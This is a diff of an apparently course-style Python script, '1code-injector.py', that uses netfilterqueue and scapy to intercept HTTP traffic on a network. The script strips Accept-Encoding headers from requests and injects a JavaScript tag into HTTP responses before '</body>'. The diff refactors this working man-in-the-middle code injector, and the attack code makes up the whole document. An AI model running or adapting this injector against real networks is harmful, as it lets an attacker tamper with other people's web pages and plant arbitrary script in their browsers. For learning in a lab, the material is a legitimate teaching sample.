@@ -93,7 +93,19 @@
 # 12) Now if we run our code 1code-injector.py in kali machie and run bing.com, we will
 # get an alert in browser once the page loads, which means the javascript code that we injected got executed in the target page
 
-
+########new#########
+# 13) lets refactor this code
+# -> Create new variable for load and use it wherever needed
+# load = scapy_packet[scapy.Raw].load
+# # modified_load is redundant and we can reuse load for it
+# load = re.sub("Accept-Encoding:.*?\\r\\n","", load)
+# -> We have repeated code here:
+# new_packet = set_load(scapy_packet, load)
+# packet.set_payload(str(new_packet))
+# --> To avoid repetitive code we check for load gets modified and then execute those statements
+# if load != scapy_packet[scapy.Raw].load:
+#     new_packet = set_load(scapy_packet, load)
+#     packet.set_payload(str(new_packet))
 
 #!/usr/bin/env python3
 import netfilterqueue
@@ -115,16 +127,18 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
 
     if scapy_packet.haslayer(scapy.Raw):
+        load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
             print("HTTP Request")
-            modified_load = re.sub("Accept-Encoding:.*?\\r\\n","", scapy_packet[scapy.Raw].load)
-            new_packet = set_load(scapy_packet,modified_load)
-            packet.set_payload(str(new_packet))
+            load = re.sub("Accept-Encoding:.*?\\r\\n","", load)
             print(scapy_packet.show())
         elif scapy_packet[scapy.TCP].sport ==80:
             print("HTTP response")
-            modified_load = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('test')</script></body>")
-            new_packet = set_load(scapy_packet,modified_load )
+            load = load.replace("</body>", "<script>alert('test')</script></body>")
+
+
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet,load )
             packet.set_payload(str(new_packet))
 
 
